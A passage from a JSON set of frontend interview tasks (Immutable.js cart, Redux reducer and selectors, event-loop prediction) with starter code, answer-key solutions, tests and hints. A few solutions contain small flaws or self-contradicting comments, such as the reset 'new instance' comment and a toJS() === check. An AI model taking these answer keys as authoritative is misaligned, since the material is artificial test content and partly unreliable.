          "startingCode": "import { Map, List, fromJS } from 'immutable';\n\n// 1. Initial Cart State\nconst initialCartState = Map({\n  items: List(),\n  totalPrice: 0,\n});\n\n// Helper to calculate total price\nconst calculateTotalPrice = (items) => {\n  return items.reduce((sum, item) => sum + (item.get('price') * item.get('quantity')), 0);\n};\n\n/**\n * Adds an item to the cart or updates its quantity if already present.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {object} item The plain JS item to add/update: { id, name, price, quantity }\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction addItemToCart(cart, item) {\n  // TODO: Implement this function\n  return cart;\n}\n\n/**\n * Removes an item from the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to remove.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction removeItemFromCart(cart, itemId) {\n  // TODO: Implement this function\n  return cart;\n}\n\n/**\n * Updates the quantity of an item in the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to update.\n * @param {number} newQuantity The new quantity for the item.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction updateItemQuantity(cart, itemId, newQuantity) {\n  // TODO: Implement this function\n  return cart;\n}\n\n// Example Usage (for testing):\n// let currentCart = initialCartState;\n// console.log('Initial Cart:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\n// console.log('After adding Laptop:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p2', name: 'Mouse', price: 25, quantity: 2 });\n// console.log('After adding Mouse:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 }); // Add existing item\n// console.log('After adding Laptop again:', currentCart.toJS());\n\n// currentCart = updateItemQuantity(currentCart, 'p2', 5);\n// console.log('After updating Mouse quantity:', currentCart.toJS());\n\n// currentCart = removeItemFromCart(currentCart, 'p1');\n// console.log('After removing Laptop:', currentCart.toJS());\n",
          "solutionCode": "import { Map, List, fromJS } from 'immutable';\n\n// 1. Initial Cart State\nconst initialCartState = Map({\n  items: List(),\n  totalPrice: 0,\n});\n\n// Helper to calculate total price\nconst calculateTotalPrice = (items) => {\n  return items.reduce((sum, item) => sum + (item.get('price') * item.get('quantity')), 0);\n};\n\n/**\n * Adds an item to the cart or updates its quantity if already present.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {object} item The plain JS item to add/update: { id, name, price, quantity }\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction addItemToCart(cart, item) {\n  const existingItemIndex = cart.get('items').findIndex(cartItem => cartItem.get('id') === item.id);\n\n  let newItems;\n  if (existingItemIndex !== -1) {\n    // Item exists, update quantity\n    newItems = cart.get('items').update(existingItemIndex, cartItem =>\n      cartItem.update('quantity', q => q + item.quantity)\n    );\n  } else {\n    // Item does not exist, add new item (convert to Immutable Map first)\n    newItems = cart.get('items').push(fromJS(item));\n  }\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n/**\n * Removes an item from the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to remove.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction removeItemFromCart(cart, itemId) {\n  const newItems = cart.get('items').filterNot(item => item.get('id') === itemId);\n\n  // If the list size hasn't changed, the item wasn't found, so return original cart\n  if (newItems.size === cart.get('items').size && newItems !== cart.get('items')) {\n      return cart; // No item removed, no state change\n  }\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n/**\n * Updates the quantity of an item in the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to update.\n * @param {number} newQuantity The new quantity for the item.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction updateItemQuantity(cart, itemId, newQuantity) {\n  if (newQuantity <= 0) {\n    return removeItemFromCart(cart, itemId); // Remove if quantity is 0 or less\n  }\n\n  const existingItemIndex = cart.get('items').findIndex(cartItem => cartItem.get('id') === itemId);\n\n  if (existingItemIndex === -1) {\n    return cart; // Item not found, return original cart\n  }\n\n  const newItems = cart.get('items').update(existingItemIndex, item =>\n    item.set('quantity', newQuantity)\n  );\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n// --- Test Cases ---\nlet currentCart = initialCartState;\nconsole.log('Initial Cart:', currentCart.toJS()); // { items: [], totalPrice: 0 }\n\n// Test 1: Add first item\ncurrentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\nconsole.log('Test 1 (Add Laptop):', currentCart.toJS()); // { items: [{ id: 'p1', name: 'Laptop', price: 1200, quantity: 1 }], totalPrice: 1200 }\n\n// Test 2: Add second item\ncurrentCart = addItemToCart(currentCart, { id: 'p2', name: 'Mouse', price: 25, quantity: 2 });\nconsole.log('Test 2 (Add Mouse):', currentCart.toJS()); // { items: [..., { id: 'p2', name: 'Mouse', price: 25, quantity: 2 }], totalPrice: 1250 }\n\n// Test 3: Add existing item (Laptop) - quantity should increase\nconst originalCartBeforeDup = currentCart;\ncurrentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\nconsole.log('Test 3 (Add Laptop again):', currentCart.toJS()); // { items: [{ id: 'p1', ..., quantity: 2 }, ...], totalPrice: 2450 }\nconsole.log('Original cart unchanged:', originalCartBeforeDup.toJS() === currentCart.toJS()); // Should be false\n\n// Test 4: Update quantity of an item\ncurrentCart = updateItemQuantity(currentCart, 'p2', 5);\nconsole.log('Test 4 (Update Mouse quantity to 5):', currentCart.toJS()); // { items: [..., { id: 'p2', ..., quantity: 5 }], totalPrice: 2525 }\n\n// Test 5: Remove an item\ncurrentCart = removeItemFromCart(currentCart, 'p1');\nconsole.log('Test 5 (Remove Laptop):', currentCart.toJS()); // { items: [{ id: 'p2', ..., quantity: 5 }], totalPrice: 125 }\n\n// Test 6: Try to remove non-existent item\nconst cartBeforeNonExistentRemoval = currentCart;\ncurrentCart = removeItemFromCart(currentCart, 'p99');\nconsole.log('Test 6 (Remove non-existent):', currentCart.toJS()); // Should be same as previous state\nconsole.log('Cart unchanged after non-existent removal:', cartBeforeNonExistentRemoval === currentCart); // Should be true\n\n// Test 7: Update quantity to 0 (should remove item)\ncurrentCart = updateItemQuantity(currentCart, 'p2', 0);\nconsole.log('Test 7 (Update Mouse quantity to 0):', currentCart.toJS()); // { items: [], totalPrice: 0 }\n\n// Test 8: Empty cart state\ncurrentCart = initialCartState;\nconsole.log('Test 8 (Reset to initial state):', currentCart.toJS()); // { items: [], totalPrice: 0 }\n",
          "testCases": [
            "Add first item: cart should contain one item with correct price and total.",
            "Add second item: cart should contain two distinct items with correct total.",
            "Add an existing item: quantity should be incremented, total price updated, original cart unchanged.",
            "Update item quantity: quantity should change, total price recalculated, original cart unchanged.",
            "Update item quantity to zero or less: item should be removed, total price updated.",
            "Remove an item: item should be gone, total price updated, original cart unchanged.",
            "Remove a non-existent item: cart should remain unchanged (referential equality should hold).",
            "Cart with multiple items, perform mixed operations (add, update, remove) in sequence, verify final state and total price."
          ],
          "hints": [
            "Remember to use `fromJS(item)` when adding a plain JavaScript object into an Immutable.js collection like `Immutable.List`.",
            "For updating an item's quantity in a list, `Immutable.List.prototype.update(index, updaterFn)` or `map` with a conditional update can be useful.",
            "The `findIndex` method on `Immutable.List` can help locate items by ID.",
            "Always return a *new* Immutable Map after any modification; do not mutate the original `cart` object passed to the function.",
            "The `calculateTotalPrice` helper should be called after any changes to the `items` list."
          ],
          "tags": [
            "Immutable.js",
            "State Management",
            "Data Structures",
            "Frontend",
            "Interview Task"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "immutability",
            "functional_programming",
            "redux_state_management"
          ]
        },
        {
          "id": "task_redux_immutable_reducer",
          "title": "Build a Simple Feature Reducer with Immutable.js",
          "description": "\nImplement a Redux reducer for a 'Settings' feature. The state for this feature should be an `Immutable.Map` that stores user settings. You need to handle several actions, ensuring all state updates adhere to immutability using `Immutable.js`.\n\n**Initial State:**\n`Immutable.Map({ theme: 'light', notificationsEnabled: true, language: 'en' })`\n\n**Actions to Handle:**\n1.  **`SET_THEME`**: payload: `{ newTheme: 'dark' | 'light' | 'system' }`. Updates the `theme` setting.\n2.  **`TOGGLE_NOTIFICATIONS`**: No payload. Toggles the `notificationsEnabled` boolean setting.\n3.  **`CHANGE_LANGUAGE`**: payload: `{ newLang: 'es' | 'fr' | 'en' }`. Updates the `language` setting.\n4.  **`RESET_SETTINGS`**: No payload. Resets the entire settings state back to the `initialState`.\n5.  **`UPDATE_MULTIPLE_SETTINGS`**: payload: `{ theme?: string, notificationsEnabled?: boolean, language?: string }`. Merges the provided partial settings object into the current state. This payload might be a plain JS object.\n\nYour reducer must return a new `Immutable.Map` for every valid state change. Default to the current state for unhandled actions.\n",
          "difficulty": "medium",
          "startingCode": "import { Map, fromJS } from 'immutable';\n\nconst initialSettingsState = Map({\n  theme: 'light',\n  notificationsEnabled: true,\n  language: 'en'\n});\n\nfunction settingsReducer(state = initialSettingsState, action) {\n  switch (action.type) {\n    case 'SET_THEME':\n      // TODO: Implement theme update\n      return state;\n    case 'TOGGLE_NOTIFICATIONS':\n      // TODO: Implement notification toggle\n      return state;\n    case 'CHANGE_LANGUAGE':\n      // TODO: Implement language change\n      return state;\n    case 'RESET_SETTINGS':\n      // TODO: Implement reset\n      return state;\n    case 'UPDATE_MULTIPLE_SETTINGS':\n      // TODO: Implement merging multiple settings\n      return state;\n    default:\n      return state;\n  }\n}\n\n// Example Usage (for testing):\n// let currentSettings = settingsReducer(undefined, { type: '@@INIT' }); // Simulate Redux init\n// console.log('Initial settings:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'SET_THEME', payload: { newTheme: 'dark' } });\n// console.log('After SET_THEME to dark:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'TOGGLE_NOTIFICATIONS' });\n// console.log('After TOGGLE_NOTIFICATIONS:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'CHANGE_LANGUAGE', payload: { newLang: 'es' } });\n// console.log('After CHANGE_LANGUAGE to es:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'UPDATE_MULTIPLE_SETTINGS', payload: { theme: 'system', language: 'fr' } });\n// console.log('After UPDATE_MULTIPLE_SETTINGS:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'RESET_SETTINGS' });\n// console.log('After RESET_SETTINGS:', currentSettings.toJS());\n",
          "solutionCode": "import { Map, fromJS } from 'immutable';\n\nconst initialSettingsState = Map({\n  theme: 'light',\n  notificationsEnabled: true,\n  language: 'en'\n});\n\nfunction settingsReducer(state = initialSettingsState, action) {\n  switch (action.type) {\n    case 'SET_THEME':\n      return state.set('theme', action.payload.newTheme);\n    case 'TOGGLE_NOTIFICATIONS':\n      return state.update('notificationsEnabled', enabled => !enabled);\n    case 'CHANGE_LANGUAGE':\n      return state.set('language', action.payload.newLang);\n    case 'RESET_SETTINGS':\n      // Return a *new* instance of the initial state, not the same reference\n      return initialSettingsState;\n    case 'UPDATE_MULTIPLE_SETTINGS':\n      // Merge assumes action.payload can be directly merged. \n      // If it's a plain JS object, fromJS will convert it to Immutable for merging.\n      return state.merge(action.payload);\n    default:\n      return state;\n  }\n}\n\n// --- Test Cases ---\nlet currentSettings = settingsReducer(undefined, { type: '@@INIT' }); // Simulate Redux init\nconsole.log('Initial settings:', currentSettings.toJS());\n// Expected: { theme: 'light', notificationsEnabled: true, language: 'en' }\n\nconst state1 = settingsReducer(currentSettings, { type: 'SET_THEME', payload: { newTheme: 'dark' } });\nconsole.log('After SET_THEME to dark:', state1.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: true, language: 'en' }\nconsole.log('Original state unchanged (state1 !== currentSettings):', state1 !== currentSettings); // true\n\nconst state2 = settingsReducer(state1, { type: 'TOGGLE_NOTIFICATIONS' });\nconsole.log('After TOGGLE_NOTIFICATIONS:', state2.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: false, language: 'en' }\nconsole.log('Original state unchanged (state2 !== state1):', state2 !== state1); // true\n\nconst state3 = settingsReducer(state2, { type: 'CHANGE_LANGUAGE', payload: { newLang: 'es' } });\nconsole.log('After CHANGE_LANGUAGE to es:', state3.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: false, language: 'es' }\nconsole.log('Original state unchanged (state3 !== state2):', state3 !== state2); // true\n\nconst state4 = settingsReducer(state3, { type: 'UPDATE_MULTIPLE_SETTINGS', payload: { theme: 'system', language: 'fr' } });\nconsole.log('After UPDATE_MULTIPLE_SETTINGS:', state4.toJS());\n// Expected: { theme: 'system', notificationsEnabled: false, language: 'fr' }\nconsole.log('Original state unchanged (state4 !== state3):', state4 !== state3); // true\n\nconst state5 = settingsReducer(state4, { type: 'RESET_SETTINGS' });\nconsole.log('After RESET_SETTINGS:', state5.toJS());\n// Expected: { theme: 'light', notificationsEnabled: true, language: 'en' }\nconsole.log('Original state unchanged (state5 !== state4):', state5 !== state4); // true\nconsole.log('Reset state is new instance of initial:', state5 === initialSettingsState); // true (since initialSettingsState is a Map literal, its reference is consistent if not modified)\n\nconst state6 = settingsReducer(state5, { type: 'UNKNOWN_ACTION' });\nconsole.log('After UNKNOWN_ACTION:', state6.toJS());\n// Expected: Same as state5\nconsole.log('State unchanged (state6 === state5):', state6 === state5); // true (for default case, return same reference)\n",
          "testCases": [
            "Initial state should be correctly set.",
            "SET_THEME: updates 'theme' property, returns new state.",
            "TOGGLE_NOTIFICATIONS: flips 'notificationsEnabled', returns new state.",
            "CHANGE_LANGUAGE: updates 'language' property, returns new state.",
            "RESET_SETTINGS: returns the original `initialSettingsState` Map.",
            "UPDATE_MULTIPLE_SETTINGS: correctly merges partial data, handles plain JS payload (if `merge` is used correctly with `fromJS` or plain objects that get converted internally by merge).",
            "Unhandled action: returns the exact same state reference.",
            "Verify immutability: Ensure `oldState !== newState` for all modifying actions, and `oldState === newState` for unhandled actions."
          ],
          "hints": [
            "For `SET_THEME` and `CHANGE_LANGUAGE`, the `set` method on `Immutable.Map` is appropriate.",
            "For `TOGGLE_NOTIFICATIONS`, consider using the `update` method to apply a function to the current boolean value.",
            "For `RESET_SETTINGS`, simply return the `initialSettingsState` constant.",
            "For `UPDATE_MULTIPLE_SETTINGS`, the `merge` method of `Immutable.Map` is designed for this purpose. It can take a plain JavaScript object as an argument and will convert it internally.",
            "Remember that all Immutable.js methods like `set`, `update`, `merge` return *new* Immutable instances. Your reducer should always return this new instance."
          ],
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "State Management",
            "Interview Task"
          ],
          "timeEstimate": 40,
          "prerequisites": [
            "redux_with_immutable_js"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "immutability",
            "pure_functions",
            "functional_programming"
          ]
        },
        {
          "id": "task_redux_selectors_implementation",
          "title": "Implement Redux Selectors for a Blog Post Application",
          "description": "\nFor a Redux application managing blog posts and users, implement several selectors using `Immutable.js` and optionally `reselect` (if you want to demonstrate memoization).\n\n**Given Immutable.js State Structure:**\n```javascript\nimport { Map, List } from 'immutable';\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n```\n\n**Selectors to Implement:**\n1.  **`getAllPosts`**: A basic selector that returns the `List` of all posts.\n2.  **`getUsers`**: A basic selector that returns the `Map` of all users.\n3.  **`getPublishedPosts`**: A derived selector that filters `getAllPosts` to return only posts where `published` is `true`.\n4.  **`getPostsByAuthor(state, authorId)`**: A derived selector that takes the state and an `authorId` as arguments, returning posts written by that author.\n5.  **`getPostWithAuthorName`**: A derived selector that returns a list of posts, but each post object should include an additional `authorName` property (e.g., `{ id: 'post1', title: '...', authorId: 'userA', authorName: 'Alice', ...}`).\n6.  **`getPopularPublishedPosts`**: A derived selector that returns published posts with `views` greater than or equal to 100, sorted by `views` in descending order.\n\nAll selectors should return Immutable.js structures unless specifically stated (e.g., `toJS()` is optional for viewing, but selectors should aim to return Immutable for performance).\n",
          "difficulty": "hard",
          "startingCode": "import { Map, List } from 'immutable';\nimport { createSelector } from 'reselect'; // Optional, but good practice for derived selectors\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n\n// 1. getAllPosts\nconst getAllPosts = state => { /* TODO */ return state.get('posts'); };\n\n// 2. getUsers\nconst getUsers = state => { /* TODO */ return state.get('users'); };\n\n// 3. getPublishedPosts\n// const getPublishedPosts = createSelector(\n//   [getAllPosts],\n//   (posts) => { /* TODO */ return posts; }\n// );\n\n// 4. getPostsByAuthor\n// const getPostsByAuthor = createSelector(\n//   [getAllPosts, (state, authorId) => authorId], // Second argument is the authorId\n//   (posts, authorId) => { /* TODO */ return posts; }\n// );\n\n// 5. getPostWithAuthorName\n// const getPostWithAuthorName = createSelector(\n//   [getAllPosts, getUsers],\n//   (posts, users) => { /* TODO */ return posts; }\n// );\n\n// 6. getPopularPublishedPosts\n// const getPopularPublishedPosts = createSelector(\n//   [getPublishedPosts],\n//   (publishedPosts) => { /* TODO */ return publishedPosts; }\n// );\n\n// Example Usage (for testing):\n// console.log('All Posts:', getAllPosts(blogAppState).toJS());\n// console.log('Published Posts:', getPublishedPosts(blogAppState).toJS());\n// console.log('Posts by Alice:', getPostsByAuthor(blogAppState, 'userA').toJS());\n// console.log('Posts with Author Name:', getPostWithAuthorName(blogAppState).toJS());\n// console.log('Popular Published Posts:', getPopularPublishedPosts(blogAppState).toJS());\n",
          "solutionCode": "import { Map, List } from 'immutable';\nimport { createSelector } from 'reselect';\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n\n// 1. getAllPosts\nconst getAllPosts = state => state.get('posts');\n\n// 2. getUsers\nconst getUsers = state => state.get('users');\n\n// 3. getPublishedPosts (using createSelector for memoization)\nconst getPublishedPosts = createSelector(\n  [getAllPosts],\n  (posts) => posts.filter(post => post.get('published'))\n);\n\n// 4. getPostsByAuthor (takes an additional argument)\nconst getPostsByAuthor = createSelector(\n  [getAllPosts, (state, authorId) => authorId], // Second input selector gets the argument\n  (posts, authorId) => posts.filter(post => post.get('authorId') === authorId)\n);\n\n// 5. getPostWithAuthorName\nconst getPostWithAuthorName = createSelector(\n  [getAllPosts, getUsers],\n  (posts, users) => {\n    return posts.map(post => {\n      const author = users.get(post.get('authorId'));\n      return post.set('authorName', author ? author.get('name') : 'Unknown');\n    });\n  }\n);\n\n// 6. getPopularPublishedPosts\nconst getPopularPublishedPosts = createSelector(\n  [getPublishedPosts], // Uses the previously defined selector\n  (publishedPosts) => {\n    return publishedPosts\n      .filter(post => post.get('views') >= 100)\n      .sortBy(post => -post.get('views')); // Sort descending by views\n  }\n);\n\n// --- Test Cases ---\nconsole.log('--- Selector Test Results ---');\n\nconsole.log('\\n1. All Posts:');\nconsole.log(getAllPosts(blogAppState).toJS());\n// Expected: List of 4 posts\n\nconsole.log('\\n2. Users:');\nconsole.log(getUsers(blogAppState).toJS());\n// Expected: Map of 3 users\n\nconsole.log('\\n3. Published Posts:');\nconsole.log(getPublishedPosts(blogAppState).toJS());\n// Expected: 3 posts (post1, post2, post4)\n\nconsole.log('\\n4. Posts by Alice (userA):');\nconsole.log(getPostsByAuthor(blogAppState, 'userA').toJS());\n// Expected: 2 posts (post1, post3)\n\nconsole.log('\\n5. Posts with Author Name:');\nconsole.log(getPostWithAuthorName(blogAppState).toJS());\n/* Expected:\n[ { id: 'post1', ..., authorName: 'Alice' },\n  { id: 'post2', ..., authorName: 'Bob' },\n  { id: 'post3', ..., authorName: 'Alice' },\n  { id: 'post4', ..., authorName: 'Charlie' } ]\n*/\n\nconsole.log('\\n6. Popular Published Posts:');\nconsole.log(getPopularPublishedPosts(blogAppState).toJS());\n/* Expected (sorted by views desc):\n[ { id: 'post2', ..., views: 200 },\n  { id: 'post1', ..., views: 150 },\n  { id: 'post4', ..., views: 100 } ]\n*/\n\n// Test memoization (conceptual: calling again with same state should not re-compute)\nconsole.log('\\n--- Memoization Test (Conceptual) ---');\nconst firstCallPublished = getPublishedPosts(blogAppState);\nconst secondCallPublished = getPublishedPosts(blogAppState);\nconsole.log('getPublishedPosts (first call === second call):', firstCallPublished === secondCallPublished); // Should be true if memoized\n\nconst newStateDifferentUser = blogAppState.setIn(['users', 'userA', 'name'], 'Alicia');\nconst thirdCallPublished = getPublishedPosts(newStateDifferentUser); // Posts list is same reference\nconsole.log('getPublishedPosts (second call === third call, only user changed):', secondCallPublished === thirdCallPublished); // Should be true, as posts input hasn't changed\n\nconst newStateDifferentPost = blogAppState.setIn(['posts', 0, 'views'], 155);\nconst fourthCallPublished = getPublishedPosts(newStateDifferentPost); // Posts list is new reference\nconsole.log('getPublishedPosts (third call === fourth call, posts changed):', thirdCallPublished === fourthCallPublished); // Should be false, as input posts changed\n",
          "testCases": [
            "getAllPosts: returns all posts as an Immutable.List.",
            "getUsers: returns all users as an Immutable.Map.",
            "getPublishedPosts: filters correctly, returning only published posts.",
            "getPostsByAuthor: correctly filters posts by a given authorId.",
            "getPostWithAuthorName: correctly joins post data with author name, adding a new property.",
            "getPopularPublishedPosts: filters by views and published status, then sorts by views descending.",
            "Verify memoization (if `reselect` used): calling the same selector with unchanged inputs returns the same reference."
          ],
          "hints": [
            "Use `Immutable.List.prototype.filter()` for filtering based on conditions.",
            "Use `Immutable.List.prototype.map()` for transforming items in a list.",
            "For joining data (e.g., getting author name for a post), you'll need to access `users` data inside the selector. `Immutable.Map.prototype.get()` is useful here.",
            "`createSelector` takes an array of input selectors and a result function. The arguments to the result function are the outputs of the input selectors.",
            "For sorting, `Immutable.List.prototype.sortBy()` can be used.",
            "Remember that `Immutable.js` methods usually return new Immutable collections, so chained operations are common (e.g., `filter().map()`)."
          ],
          "tags": [
            "Redux",
            "Selectors",
            "Immutable.js",
            "Reselect",
            "State Management",
            "Data Transformation",
            "Interview Task"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections",
            "functional_programming_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "memoization",
            "data_normalization",
            "performance_optimization"
          ]
        },
        {
          "id": "task_js_event_loop_prediction",
          "title": "Predict Execution Order with JavaScript Asynchronous Operations",
          "description": "\nAnalyze the provided JavaScript code snippet involving `setTimeout`, `Promise`, and synchronous operations. Your task is to predict the exact order of outputs to the console based on your understanding of the JavaScript Event Loop, Call Stack, and Microtask Queue.\n\n**Instructions:**\n1.  Read the code carefully.\n2.  Without running the code, write down the predicted output order.\n3.  For each `console.log`, explain *why* it appears at that specific point in the sequence, referencing the Call Stack, Web APIs, Microtask Queue, and Callback Queue (Task Queue) as appropriate.\n",
          "difficulty": "hard",
          "startingCode": "```javascript\nconsole.log('Start');\n\nsetTimeout(() => {\n  console.log('setTimeout 1');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Promise 1');\n});\n\nsetTimeout(() => {\n  console.log('setTimeout 2');\n  Promise.resolve().then(() => {\n    console.log('Promise 2 (nested)');\n  });\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Promise 3');\n});\n\nconsole.log('End');\n```\n",
          "solutionCode": "```javascript\n/*\nPredicted Output Order and Explanation:\n\n1.  **'Start'**\n    *   `console.log('Start')` is a synchronous operation. It's immediately pushed onto the Call Stack and executed.\n    *   Call Stack: [`console.log('Start')`]\n    *   Output: `Start`\n\n2.  **'End'**\n    *   The `setTimeout` calls are asynchronous Web APIs. Their callbacks are registered and then moved to the Task Queue after their timer expires (even 0ms).\n        *   `setTimeout(() => { console.log('setTimeout 1'); }, 0);` -> Callback for 'setTimeout 1' added to Task Queue.\n        *   `setTimeout(() => { ... }, 0);` -> Callback for 'setTimeout 2' added to Task Queue.\n    *   The `Promise.resolve().then()` calls create microtasks. These microtasks are added to the Microtask Queue.\n        *   `Promise.resolve().then(() => { console.log('Promise 1'); });` -> Callback for 'Promise 1' added to Microtask Queue.\n        *   `Promise.resolve().then(() => { console.log('Promise 3'); });` -> Callback for 'Promise 3' added to Microtask Queue.\n    *   `console.log('End')` is synchronous. It's pushed onto the Call Stack and executed immediately after all other synchronous code.\n    *   Call Stack: [`console.log('End')`]\n    *   Output: `End`\n\n    *   At this point, the Call Stack is empty.\n    *   Microtask Queue: ['Promise 1' callback, 'Promise 3' callback]\n    *   Task Queue: ['setTimeout 1' callback, 'setTimeout 2' callback]\n\n3.  **'Promise 1'**\n    *   The Event Loop checks if the Call Stack is empty. It is.\n    *   It then checks the Microtask Queue. It processes *all* microtasks before moving to the Task Queue.\n    *   The first microtask, 'Promise 1' callback, is moved from Microtask Queue to Call Stack.\n    *   Call Stack: [`console.log('Promise 1')`]\n    *   Output: `Promise 1`\n\n4.  **'Promise 3'**\n    *   The Call Stack becomes empty after 'Promise 1' callback executes.\n    *   The Event Loop checks Microtask Queue again. It finds the 'Promise 3' callback.\n    *   'Promise 3' callback is moved to Call Stack.\n    *   Call Stack: [`console.log('Promise 3')`]\n    *   Output: `Promise 3`\n\n    *   At this point, the Microtask Queue is empty.\n\n5.  **'setTimeout 1'**\n    *   The Call Stack is empty.\n    *   The Microtask Queue is empty.\n    *   The Event Loop now moves to the Task Queue and takes the first task, 'setTimeout 1' callback.\n    *   Call Stack: [`console.log('setTimeout 1')`]\n    *   Output: `setTimeout 1`\n\n6.  **'setTimeout 2'**\n    *   The Call Stack is empty.\n    *   The Event Loop moves to the Task Queue and takes the next task, 'setTimeout 2' callback.\n    *   Call Stack: [`console.log('setTimeout 2')`, `Promise.resolve().then(() => { console.log('Promise 2 (nested)'); })`]\n    *   Output: `setTimeout 2`\n    *   Inside 'setTimeout 2' callback, `Promise.resolve().then()` is encountered. Its callback ('Promise 2 (nested)') is added to the Microtask Queue.\n    *   Microtask Queue: ['Promise 2 (nested)' callback] (now has a task)\n\n7.  **'Promise 2 (nested)'**\n    *   The Call Stack becomes empty after 'setTimeout 2' callback finishes.\n    *   The Event Loop checks the Microtask Queue. It finds the 'Promise 2 (nested)' callback.\n    *   'Promise 2 (nested)' callback is moved to Call Stack.\n    *   Call Stack: [`console.log('Promise 2 (nested)')`]\n    *   Output: `Promise 2 (nested)`\n\nFinal Predicted Output Sequence:\nStart\nEnd\nPromise 1\nPromise 3\nsetTimeout 1\nsetTimeout 2\nPromise 2 (nested)\n*/\n```",
          "testCases": [
            "Verify synchronous code executes first.",
            "Verify all top-level microtasks execute before any macrotasks (setTimeout callbacks).",
            "Verify nested microtasks (created within a macrotask) execute immediately after the macrotask completes, before the next macrotask."
          ],
          "hints": [
            "Remember the order of operations for the Event Loop: Call Stack -> Microtask Queue -> Task Queue (Callback Queue).",
            "Promises create microtasks, `setTimeout` creates macrotasks.",
            "The Event Loop processes *all* available microtasks *after* each macrotask completes and *before* taking the next macrotask.",
            "Synchronous code runs to completion before the event loop even starts checking queues."
          ],
          "tags": [
            "JavaScript",
            "Event Loop",
            "Call Stack",
            "Microtask Queue",
